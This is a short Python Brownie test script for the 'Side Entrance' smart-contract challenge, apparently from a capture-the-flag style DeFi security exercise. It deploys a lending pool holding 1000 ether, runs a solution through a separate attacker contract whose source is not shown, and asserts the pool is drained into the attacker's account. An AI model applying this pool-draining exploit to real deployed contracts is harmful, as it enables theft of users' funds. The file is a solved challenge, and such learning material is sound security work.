from brownie import accounts, SideEntranceLenderPool, SideEntranceAttacker
from brownie.network.account import Account
from brownie.network.contract import ProjectContract


def test_side_entrance():
    deployer: Account = accounts[0]
    attacker: Account = accounts[1]
    ETHER_IN_POOL = 1000e18

    pool: ProjectContract = SideEntranceLenderPool.deploy({"from": deployer})
    pool.deposit({"from": deployer, "amount": ETHER_IN_POOL})
    attackerInitialEthBalance = attacker.balance()
    assert pool.balance() == ETHER_IN_POOL
    # YOUR EXPLOIT GOES HERE
    sea = SideEntranceAttacker.deploy(pool.address, {"from": attacker})
    sea.run({"from": attacker})
    sea.withdraw({"from": attacker})

    # SUCCESS CONDITIONN
    assert pool.balance() == 0
    assert attacker.balance() > attackerInitialEthBalance
